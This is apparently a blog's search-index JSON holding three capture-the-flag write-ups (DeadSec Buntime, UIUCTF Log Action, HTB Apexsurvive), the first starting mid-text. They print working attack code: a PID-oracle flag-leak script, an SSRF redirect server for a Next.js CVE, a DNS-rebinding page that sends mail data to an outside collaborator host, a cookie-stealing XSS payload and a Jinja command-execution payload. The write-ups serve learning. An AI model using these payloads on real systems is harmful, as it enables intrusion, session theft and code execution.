code:\nBun.spawnSync function appears to be overwritten with a WAF message, WAF blocks our input from the POST body if it\u0026rsquo;s too long (I didn\u0026rsquo;t count it, but it\u0026rsquo;s about ~30 chars give or take), We can\u0026rsquo;t call await directly, Even though we can call Bun.spawn, we seemingly can\u0026rsquo;t write anywhere (tried /tmp and /dev/shm), There\u0026rsquo;s no outside network connectivity. However, we\u0026rsquo;re able to confirm that the flag is in /flag.txt by running Bun.file('/flag.txt').size.\nPID Oracle First, let\u0026rsquo;s get around around the input length limitation. To achieve this, we\u0026rsquo;ll move our payload to A header and execute it using \u0026quot;eval(request.headers.get('a')).\nBun.spawn is available, and even though we:\ncan\u0026rsquo;t access its result directly since it\u0026rsquo;s async, can\u0026rsquo;t make a network call to our webhook, can\u0026rsquo;t write anywhere. We can get the PID of the spawned process syncronously.\nOur plan is the following: we\u0026rsquo;ll spawn a command that\u0026rsquo;ll check if nth character of /flag.txt is equal to some character. If it is, we\u0026rsquo;ll spawn more processes. This will make our next call result have a significantly higher PID, since the processes have their PIDs assigned incrementally. We\u0026rsquo;ll check the difference of the resulting PIDs between calls to leak the flag content. This approach is prone to interference from others processes being started, but since we have our own instance for the challenge I haven\u0026rsquo;t run into any problems with it. Here\u0026rsquo;s my code to leak the flag:\nimport requests import string import time url = \u0026#34;https://2ca80b849337494b5275bf11.deadsec.quest/run\u0026#34; headers_template = { \u0026#34;Host\u0026#34;: \u0026#34;2ca80b849337494b5275bf11.deadsec.quest\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;*/*\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;https://2ca80b849337494b5275bf11.deadsec.quest\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;https://2ca80b849337494b5275bf11.deadsec.quest/\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;en-US,en;q=0.9\u0026#34;, \u0026#34;Priority\u0026#34;: \u0026#34;u=1, i\u0026#34; } payload = {\u0026#34;code\u0026#34;: \u0026#34;eval(request.headers.get(\u0026#39;a\u0026#39;))\u0026#34;} last_result = None flag_text = \u0026#39;DEAD{\u0026#39; character_set = string.ascii_letters + string.digits + \u0026#39;\u0026#39;.join( c for c in string.punctuation if c not in [\u0026#34;\u0026#39;\u0026#34;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;]) last_char = \u0026#39;\u0026#39; pid_diff_threshold = 7 for i in range(6, 60): for j in character_set: command = f\u0026#39;[ \u0026#34;$(head -c {i} /flag.txt | tail -c 1)\u0026#34; == \u0026#34;{j}\u0026#34; ] \u0026amp;\u0026amp; (sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp;)\u0026#39; headers = headers_template.copy() headers[\u0026#34;A\u0026#34;] = f\u0026#34;const command = \u0026#39;{command}\u0026#39;;let s=Bun.spawn({{cmd: [\u0026#39;bash\u0026#39;, \u0026#39;-c\u0026#39;, command]}});s.pid\u0026#34; response = requests.post(url, headers=headers, json=payload) if response.status_code == 200: response_json = response.json() result = response_json.get(\u0026#34;result\u0026#34;) print(f\u0026#34;|Current flag: {flag_text} | i: {i}, j: {j}, Result: {result}\u0026#34;) if last_result is not None and abs(result - last_result) \u0026gt; pid_diff_threshold: flag_text = flag_text + last_char print(f\u0026#39;Found {i}: {last_char}, diff: {abs(result - last_result)}\u0026#39;) last_result = result with open(\u0026#39;results.txt\u0026#39;, \u0026#39;a\u0026#39;) as file: file.write(f\u0026#34;{i}, {last_char}\\n\u0026#34;) file.flush() break last_result = result last_char = j else: print(f\u0026#34;Request failed for i: {i}, j: {j} with status code: {response.status_code}\u0026#34;) time.sleep(0.3) print(f\u0026#34;Flag: {flag_text}\u0026#34;) The command \u0026quot;$(head -c {i} /flag.txt | tail -c 1)\u0026quot; == \u0026quot;{j}\u0026quot; ] \u0026amp;\u0026amp; (sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp;) will spawn a few simple processes with sleep 10 if the char in /flag.txt matches our guess. My manual testing showed me that the PIDs incremented by 4 if our last guess was wrong, and by 10 if our last guess was right. That\u0026rsquo;s why I decided to set pid_diff_threshold = 7 in the middle of these 2 values. The loop range for i in range(6, 60): goes from 6 since we know the first chars are DEAD{ and up to 59 since that\u0026rsquo;s the flag size we retrieved earlier (the last char could either be a newline or } but we\u0026rsquo;ll be able to guess it anyway). We save each result to results.txt for manual inspection if anything goes bad. Here\u0026rsquo;s the script running:\nFinal Thoughts The final flag was DEAD{BunT1m3_Fun_T1m3_Y0u_C4n_4lw4y$_Run_4$ync_1n$1d3_$ync} which indicates this is an unintended solution. PID oracle would be way more difficult on a shared instance, but thankfully each team had their own instancer and there was no problem making this work. Based on the amount of solutions (11), this was the most difficult web challenge in the CTF.\n","permalink":"http://localhost:1313/posts/deadsecctf-2024-buntime/","summary":"\u003ch2 id=\"initial-inspection\"\u003eInitial Inspection\u003c/h2\u003e\n\u003cp\u003eThere\u0026rsquo;s no souce code provided for the challenge. The only thing we\u0026rsquo;re given to work with is a website that executes our input code presumably using Bun.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"buntime-website.png\" alt=\"Buntime website\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eAfter playing around with it for a bit we know that it\u0026rsquo;s Bun, since the \u003ccode\u003eBun\u003c/code\u003e variable is available and allows us to call different methods.\u003c/p\u003e\n\u003ch2 id=\"more-recon\"\u003eMore Recon\u003c/h2\u003e\n\u003cp\u003eThere are quite a few limitations to our code:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eBun.spawnSync\u003c/code\u003e function appears to be overwritten with a WAF message,\u003c/li\u003e\n\u003cli\u003eWAF blocks our input from the POST body if it\u0026rsquo;s too long (I didn\u0026rsquo;t count it, but it\u0026rsquo;s about ~30 chars give or take),\u003c/li\u003e\n\u003cli\u003eWe can\u0026rsquo;t call \u003ccode\u003eawait\u003c/code\u003e directly,\u003c/li\u003e\n\u003cli\u003eEven though we can call \u003ccode\u003eBun.spawn\u003c/code\u003e, we seemingly can\u0026rsquo;t write anywhere (tried \u003ccode\u003e/tmp\u003c/code\u003e and \u003ccode\u003e/dev/shm\u003c/code\u003e),\u003c/li\u003e\n\u003cli\u003eThere\u0026rsquo;s no outside network connectivity.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eHowever, we\u0026rsquo;re able to confirm that the flag is in \u003ccode\u003e/flag.txt\u003c/code\u003e by running \u003ccode\u003eBun.file('/flag.txt').size\u003c/code\u003e.\u003c/p\u003e","title":"DeadSec CTF 2024 Buntime"},{"content":"Initial Code Analysis Upon inspecting the code, we discovered that the frontend application is running Next.js 14.1.0. This version is vulnerable to SSRF https://nvd.nist.gov/vuln/detail/CVE-2024-34351.\nWe also notice the flag.txt file is copied to /usr/share/nginx/html/flag.txt in the backend app, meaning it\u0026rsquo;s exposed via backend/flag.txt inside the docker network.\nWe\u0026rsquo;ll perform an SSRF to make the frontend application send a request to the backend application /flag.txt and send it back to us.\nRedirect Action The CVE is pretty straightforward. First, we need to find a Next.js redirect action that\u0026rsquo;ll allow us to perform it. There are only 2 in the application: one is redirect(\u0026rsquo;/admin\u0026rsquo;); upon successful login as admin and the other one is redirect(\u0026quot;/login\u0026quot;); upon successful logout. We can\u0026rsquo;t reach redirect(\u0026rsquo;/admin\u0026rsquo;); because that would require us to guess an admin password generated randomly on each call, however the logout action is available even if the user isn\u0026rsquo;t logged in.\nRedirect Server The next step to performing the attack is setting up a redirect server. For this purpose, we write this Python code and save it as server.py:\nfrom http.server import BaseHTTPRequestHandler, HTTPServer class RedirectHandler(BaseHTTPRequestHandler): def do_GET(self): self.send_response(302) self.send_header(\u0026#39;Location\u0026#39;, \u0026#39;http://backend/flag.txt\u0026#39;) self.end_headers() def do_HEAD(self): self.send_response(200) self.send_header(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/x-component\u0026#39;) self.end_headers() def run(server_class=HTTPServer, handler_class=RedirectHandler, port=80): server_address = (\u0026#39;\u0026#39;, port) httpd = server_class(server_address, handler_class) print(f\u0026#34;Server running at http://localhost:{port}/\u0026#34;) httpd.serve_forever() if __name__ == \u0026#34;__main__\u0026#34;: run() 2 things to note here:\nWe need to answer the preflight HEAD request with Content-Type: text/x-component for the Next.js app to make the following GET request, On the GET request, we do a 302 redirect to http://backend/flag.txt which will make the frontend app send a request to it and return us the result. These steps are based on the CVE writeup at https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps.\nWe launch our python script with python3 server.py. We\u0026rsquo;ll expose our local instance globally by using https://localhost.run/. We copy the address that has been assigned to us.\nExploitation Finally, we\u0026rsquo;re ready to connect all the pieces. Let\u0026rsquo;s launch Burp, navigate to /logout, and click the logout button.\nIn Burp history, let\u0026rsquo;s repeat the POST /logout, replacing Origin and Host with our redirect server address.\nAs we can see, we successfully performed the exploitation and received the flag. We ran the attack against a local instance, but there\u0026rsquo;s no difference in exploitation against a remote one. We can also check our server logs to confirm that the app made a HEAD request followed by a GET request.\nReferences https://nvd.nist.gov/vuln/detail/CVE-2024-34351 https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps ","permalink":"http://localhost:1313/posts/uiuctf-2024-log-action/","summary":"\u003ch2 id=\"initial-code-analysis\"\u003eInitial Code Analysis\u003c/h2\u003e\n\u003cp\u003eUpon inspecting the code, we discovered that the frontend application is running Next.js 14.1.0. This version is vulnerable to SSRF \u003ca href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34351\"\u003ehttps://nvd.nist.gov/vuln/detail/CVE-2024-34351\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"nextjs-version.png\" alt=\"Next.js version\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eWe also notice the \u003cem\u003eflag.txt\u003c/em\u003e file is copied to \u003cem\u003e/usr/share/nginx/html/flag.txt\u003c/em\u003e in the backend app, meaning it\u0026rsquo;s exposed via \u003cem\u003ebackend/flag.txt\u003c/em\u003e inside the docker network.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"nginx-flag.png\" alt=\"Nginx flag\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eWe\u0026rsquo;ll perform an SSRF to make the frontend application send a request to the backend application \u003cem\u003e/flag.txt\u003c/em\u003e and send it back to us.\u003c/p\u003e","title":"UIUCTF 2024 Log Action"},{"content":"First Steps We analyze the code and notice the email page will only show emails addressed to test@email.htb.\nWe create a user with the email test@email.htb and confirm the registration by visiting the link from an email.\nDNS Rebinding to Activate an Internal User Upon further code inspection, we found out that users who sign up with an email hosted at apexsurvive.htb will be marked as internal users.\nThere\u0026rsquo;s an /external API endpoint that can be used for an open redirect.\nThe emails are served by Mailhog running on port 9000 and can be internally retrieved by using the /api/v2/messages endpoint.\nWe create a user asdf@apexsurvive.htb.\nWe log in and request a verification email. It won\u0026rsquo;t appear in emails on the website.\nWe\u0026rsquo;ll use the /external endpoint for an open redirect to our controlled website and then do DNS rebinding to fetch emails from Mailhog running on port 9000 and get the confirmation email for the internal user. To do this, we\u0026rsquo;ll set up an EC2 instance with a public IP address and then add a DNS NS record for it (keep in mind the dot at the end):\nWe have to allow incoming traffic from ports UDP 53 (for DNS) and TCP 9000 (for the HTTP server) at minimum. We configure the security group of our EC2 instance as following.\nOn the instance, we\u0026rsquo;ll run https://github.com/mogwailabs/DNSrebinder to change the resolution of my domain from EC2 public IP address to 127.0.0.1 after a moment:\nsudo python3 dnsrebinder.py --domain dynamic.mywebsite.xyz. --rebind 127.0.0.1 --ip \u0026lt;website-public-ip\u0026gt; --counter 1 --udp --ttl 1 We\u0026rsquo;ll also run an HTTP server on it serving index.html that keeps fetching /api/v2/messages for Mailhog emails and then sends them back to us. Remember it has to be on the same origin (port 9000).\nsudo python3 -m http.server 9000 index.html served by the HTTP server:\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; (function () { var axhr = new XMLHttpRequest(); axhr.open('GET', 'http://myburpcollab.oastify.com?start=start'); axhr.send() var interval = setInterval(function () { var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://dynamic.mywebsite.xyz:9000/api/v2/messages', false); xhr.onload = function () { if (xhr.status != 200) { return; } var xhr2 = new XMLHttpRequest(); xhr2.open('GET', `http://myburpcollab.oastify.com?msgs=${btoa(this.responseText)}`); xhr2.send(); }; xhr.send() }, 200) })(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; The script keeps fetching http://dynamic.mywebsite.xyz:9000/api/v2/messages in short intervals. which is on the same origin. After a while our DNS rebinder should switch from the EC2 IP address to localhost. Then, the script will successfully fetch the emails and send them back to us in base64.\nWe log in as test@email.htb and report:\n../external?url=http://dynamic.mywebsite.xyz:9000/ We notice how after a short moment our DNS server starts resolving our domain to 127.0.0.1 instead of our public IP.\nIt might take about 1 minute before the domain resolution is updated to 127.0.0.1. The first callback after the one with query parameter start=start one contains base64 encoded emails from Mailhog API. We decode them and get the confirmation link for the internal user.\nStored XSS to Steal the Session Cookie From the Admin As an internal user, we now can add products. In /application/templates/product.html we notice that the product.note (Product manual) from an input controlled by us is not sanitized and allows us to escape JS backticks.\nWe add any new product and in the product manual we put in:\n`;fetch(\u0026quot;https://myburpcollab.oastify.com/xss?c=\u0026quot;+document.cookie);let x=` We double-check we escaped JS backticks after adding the product:\nAfter we create it, we make the admin visit it by reporting its assigned product number. We take the admin session cookie from the callback.\nLeveraging a Race Condition for SSTI Leading to RCE As an admin, we now can add PDF contracts. We notice that:\nthe file is always saved to the same location before checking itâ€™s a PDF, we can save the file anywhere by path traversal using â€œ..â€ in the filename, the PDF check takes the temporary file from the file system, not directly from the request. As a result, thereâ€™s a race condition between saving the temp file and checking that itâ€™s a PDF.\nWe prepare 2 files:\na small PDF,\na Jinja template thatâ€™ll read out the flag:\nResult {{ self.__init__.__globals__.__builtins__.__import__('os').system('/readflag \u0026gt; /app/application/static/images/flag.txt') }} We upload both and add them to a burp repeater group like so:\nWe try sending them multiple times using â€œSend group (parallel)â€. We can play around with the number of PDF/Jinja template requests in the group. We watch out for message: Contract added in a response to a Jinja template upload. We check for it by refreshing any product page multiple times. If we see our payload, the flag is available under /static/images/flag.txt.\nReferences https://unit42.paloaltonetworks.com/dns-rebinding/ https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ https://portswigger.net/research/smashing-the-state-machine ","permalink":"http://localhost:1313/posts/htb-ca-2024-apexsurvive/","summary":"\u003ch2 id=\"first-steps\"\u003eFirst Steps\u003c/h2\u003e\n\u003cp\u003eWe analyze the code and notice the email page will only show emails addressed to \u003cem\u003e\u003ca href=\"mailto:test@email.htb\"\u003etest@email.htb\u003c/a\u003e\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"test-email.png\" alt=\"EmailCode\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eWe create a user with the email \u003cem\u003e\u003ca href=\"mailto:test@email.htb\"\u003etest@email.htb\u003c/a\u003e\u003c/em\u003e and confirm the registration by visiting the link from an email.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"verify-email-1.png\" alt=\"Verify email 1\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"verify-email-2.png\" alt=\"Verify email 2\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"dns-rebinding-to-activate-an-internal-user\"\u003eDNS Rebinding to Activate an Internal User\u003c/h2\u003e\n\u003cp\u003eUpon further code inspection, we found out that users who sign up with an email hosted at \u003cem\u003eapexsurvive.htb\u003c/em\u003e will be marked as internal users.\u003c/p\u003e","title":"HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup"}]